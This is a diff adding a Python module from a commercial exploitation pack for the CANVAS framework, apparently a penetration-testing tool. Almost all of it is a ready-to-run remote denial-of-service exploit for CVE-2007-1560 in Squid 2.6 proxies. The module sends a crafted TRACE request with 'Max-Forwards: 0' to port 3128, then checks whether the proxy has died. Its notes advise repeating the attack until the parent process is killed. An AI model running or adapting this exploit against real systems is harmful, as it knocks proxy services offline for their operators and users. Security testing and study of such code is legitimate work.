@@ -1,0 +1,101 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys, time
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from MOSDEF import mosdef as mosdef
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Squid Proxy TRACE Request Remote Denial of Service"
+VERSION = "0.1"
+DESCRIPTION = "Squid Proxy TRACE Request Remote Denial of Service Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "DoS"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES = """
+It maybe necessary to launch several the exploit to kill the parent process and not just a child process.
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = NOTES
+DOCUMENTATION["VersionsAffected"] = "Squid 2.6 (up to 2.6stable11)"
+DOCUMENTATION["Date public"] = "03/21/2007"
+DOCUMENTATION["CVE Name"] = "CVE-2007-1560"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1560"
+DOCUMENTATION["References"] = "http://www.squid-cache.org/Advisories/SQUID-2007_1.txt"
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setPort(3128)
+		self.setHost("")
+		self.setVersion(1)
+		self.setInfo(DESCRIPTION)
+		self.name=NAME
+		return
+    
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		
+		self.log("Connecting to %s:%d"%(self.host,self.port))
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Could not connect to %s on port %d" % (self.host, self.port))
+			return 0
+
+		buf = "TRACE http://www.squid.org HTTP/1.1\r\nMax-Forwards: 0\r\n\r\n"
+
+		try:
+			s.sendall(buf)
+		except:
+			pass
+
+		data = s.recv(65535)
+		if len(data) != 0:
+			self.log(data)
+			self.setInfo("%s attacking %s:%d - failed"%(NAME,self.host,self.port))
+			return 0
+
+		self.log("Done sending attack buffer.")
+
+		self.log("Trying to connect again.")
+
+		try:
+			s.connect((self.host, self.port))
+			self.log("We connected - it did not die - it must be patched.")
+			ret = 0
+		except: 
+			self.log("Could not connect .. good .. Squid is died.")
+			ret = 1
+			
+		self.log("Done with exploit")
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+		return ret
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:3128]"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
